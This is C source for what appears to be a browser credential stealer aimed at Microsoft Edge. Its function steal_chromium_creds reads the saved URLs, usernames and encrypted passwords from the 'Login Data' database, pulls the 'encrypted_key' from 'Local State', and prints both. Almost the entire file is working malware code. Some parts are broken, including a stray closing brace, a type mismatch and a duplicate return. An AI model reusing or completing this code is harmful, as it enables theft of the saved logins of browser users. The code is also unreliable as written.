// clang-format off
// knownfolders needs to be after shlobj
#include <shlobj.h>
#include <knownfolders.h>
// clang-format on

#include "chromium.h"

#include <stdio.h>
#include <stdlib.h>
#include <wchar.h>
#include <windows.h>

#include "sqlite3.h"

// TODO Make this a parameter so that we can support multiple chromium browsers
#define LOGINDATA_PATH L"\\Microsoft\\Edge\\User Data\\Default\\Login Data"
#define LOCAL_STATE_FILE L"\\Microsoft\\Edge\\User Data\\Local State"

// Returns the Local AppData path gathered from environment variables
PWSTR get_localappdata_path() {
  PWSTR appDataPath = NULL;
  HRESULT hr =
      SHGetKnownFolderPath(&FOLDERID_LocalAppData, 0, NULL, &appDataPath);
  if (FAILED(hr)) {
    fprintf(stderr, "Failed to retrieve APPDATA path. Error code: %08lX\n", hr);
    return NULL;
  }
  return appDataPath;
}

// Return the concatenation of `path` and `additionalPath`
PWSTR build_path(const PWSTR path, const wchar_t *additionalPath) {
  size_t totalLength = wcslen(path) + wcslen(additionalPath) + 1;
  PWSTR fullPath = (PWSTR)malloc(totalLength * sizeof(wchar_t));
  if (!fullPath) {
    fprintf(stderr, "malloc errored out");
  }

  wcscpy(fullPath, path);
  wcscat(fullPath, additionalPath);
  return fullPath;
}

// Retrieves "url login and password" from a chromium based browser sqlite
// database
// Returns an array of `LoginInfo` of size `count` the `password` in a
// `LoginInfo` is still encrypted at this point
// NOTE: Must be ran while the browser is NOT started otherwise the database is
// locked by the browser
LoginInfo *retrieve_logins(const PWSTR fullPath, int *count) {
  sqlite3 *db;
  int rc = sqlite3_open16(fullPath, &db);
  if (rc) {
    fprintf(stderr, "Can't open database: %s", sqlite3_errmsg(db));
    return NULL;
  }

  // I think it's the same for every chromium browsers though I haven't checked
  const char *query =
      "SELECT origin_url, username_value, password_value FROM logins;";
  sqlite3_stmt *statement;
  rc = sqlite3_prepare_v2(db, query, -1, &statement, 0);
  if (rc != SQLITE_OK) {
    fprintf(stderr, "Failed to execute statement: %s", sqlite3_errmsg(db));
    sqlite3_close(db);
    return NULL;
  }

  LoginInfo *logins = NULL;
  int capacity = 10;  // size of the **allocated** array
  int size = 0;       // real size (number of elements) of the array
  logins = (LoginInfo *)malloc(capacity * sizeof(LoginInfo));
  if (!logins) {
    sqlite3_finalize(statement);
    sqlite3_close(db);
    return NULL;
  }

  // go over each row and grow our `logins` accordingly
  while ((rc = sqlite3_step(statement)) == SQLITE_ROW) {
    if (size >= capacity) {
      capacity += 10;  // grow the allocated array by this much
      logins = (LoginInfo *)realloc(logins, capacity * sizeof(LoginInfo));
      if (!logins) {
        sqlite3_finalize(statement);
        sqlite3_close(db);
        return NULL;
      }
    }

    const unsigned char *origin_url = sqlite3_column_text(statement, 0);
    const unsigned char *username_value = sqlite3_column_text(statement, 1);
    const unsigned char *password_value = sqlite3_column_text(statement, 2);

    logins[size].origin_url = strdup((const char *)origin_url);
    logins[size].username = strdup((const char *)username_value);
    logins[size].password = strdup((const char *)password_value);

    size++;
  }

  sqlite3_finalize(statement);
  sqlite3_close(db);

  *count = size;
  return logins;
}

// Frees an array of LoginInfo instance
void free_logins(LoginInfo *logins, int count) {
  for (int i = 0; i < count; i++) {
    free(logins[i].origin_url);
    free(logins[i].username);
    free(logins[i].password);
  }
  free(logins);
}

// Should work all the time (upcasting == less problems)
// Allocates a PWSTR that should be freed
PWSTR ansi_to_wide(PSTR ansiString) {
  if (!ansiString) {
    return NULL;
  }

  int wideCharCount = MultiByteToWideChar(CP_ACP, 0, ansiString, -1, NULL, 0);
  if (wideCharCount == 0) {
    fprintf(stderr, "Failed to get wide character count. Error code: %lu\n",
            GetLastError());
    return NULL;
  }

  PWSTR wideString = (PWSTR)malloc(wideCharCount * sizeof(wchar_t));
  if (!wideString) {
    fprintf(stderr, "Failed to allocate memory for wide string.\n");
    return NULL;
  }

  if (MultiByteToWideChar(CP_ACP, 0, ansiString, -1, wideString,
                          wideCharCount) == 0) {
    fprintf(stderr, "Failed to convert ANSI to wide string. Error code: %lu\n",
            GetLastError());
    free(wideString);
    return NULL;
  }

  return wideString;
}

PSTR retrieve_encrypted_key(PWSTR filepath) {
  HANDLE hFile = CreateFileW(filepath, GENERIC_READ, FILE_SHARE_READ, NULL,
                             OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if (hFile == INVALID_HANDLE_VALUE) {
    printf("Failed to open file. Error code: %lu\n", GetLastError());
    return NULL;
  }

  DWORD fileSize = GetFileSize(hFile, NULL);
  if (fileSize == INVALID_FILE_SIZE) {
    printf("Failed to get file size. Error code: %lu\n", GetLastError());
    CloseHandle(hFile);
    return NULL;
  }

  // characters in the file are encoded in ASCII, we can't use wide characters
  // here so we will only convert the final result, later on for compatibility
  PSTR buffer = (PSTR)malloc(fileSize + 1);
  if (!buffer) {
    printf("Failed to allocate memory for file buffer.\n");
    CloseHandle(hFile);
    return NULL;
  }

  DWORD bytesRead;
  if (!ReadFile(hFile, buffer, fileSize * sizeof(char), &bytesRead, NULL)) {
    printf("Failed to read file. Error code: %lu\n", GetLastError());
    free(buffer);
    CloseHandle(hFile);
    return NULL;
  }
  CloseHandle(hFile);

  buffer[fileSize] = '\0';  // terminate the buffer

  const char *key = "\"encrypted_key\":";
  PSTR pos = strstr(buffer, key);
  if (!pos) {
    free(buffer);
    return NULL;
  }

  // skip the key
  pos += strlen(key);
  // skip whitespace and the beginning quote
  while (*pos == ' ' || *pos == '\t' || *pos == '"') {
    pos++;
  }

  // keep start position of the encrypted key
  PSTR start = pos;
  // pos points to the end of the encrypted key (to get the length)
  while (*pos != '"') {
    pos++;
  }

  size_t length = pos - start;
  PSTR encryptedKey = (PSTR)malloc(length + 1);
  if (!encryptedKey) {
    free(buffer);
    return NULL;
  }

  strncpy(encryptedKey, start, length);
  encryptedKey[length] = '\0';

  free(buffer);
  return encryptedKey;
}
}

int steal_chromium_creds() {
  PWSTR appDataPath = get_localappdata_path();
  if (!appDataPath) {
    return EXIT_FAILURE;
  }

  PWSTR fullPath = build_path(appDataPath, LOGINDATA_PATH);
  if (!fullPath) {
    CoTaskMemFree(
        appDataPath);  // free memory from the call to SHGetKnownFolderPath in
                       // `get_localappdata_path`
    return 1;
    return EXIT_FAILURE;
  }

  wprintf(L"Full path: %ls\n", fullPath);

  LoginInfo *logins = NULL;
  int count = 0;
  logins = retrieve_logins(fullPath, &count);
  if (!logins) {
    fprintf(stderr, "Could not retrieve logins from the database");
    return EXIT_FAILURE;
  }

  for (int i = 0; i < count; i++) {
    printf("===== LOGIN %d =====\n", i);
    printf("Origin URL: %s\n", logins[i].origin_url);
    printf("Username: %s\n", logins[i].username);
    printf("Password: %s\n", logins[i].password);
  }
  printf("====================\n");

  PWSTR login_state_path = build_path(appDataPath, LOCAL_STATE_FILE);
  wprintf(L"%ls\n", login_state_path);
  PWSTR encrypted_key = retrieve_encrypted_key(login_state_path);
  if (!encrypted_key) {
    fprintf(stderr, "All shit has gone");
  }

  wprintf(L"Encrypted key: %ls\n", encrypted_key);

  free_logins(logins, count);
  free(encrypted_key);  // allocated in ansi_to_wide
  free(fullPath);
  CoTaskMemFree(
      appDataPath);  // free memory from the call to SHGetKnownFolderPath in
                     // `get_localappdata_path`
  return EXIT_SUCCESS;
}
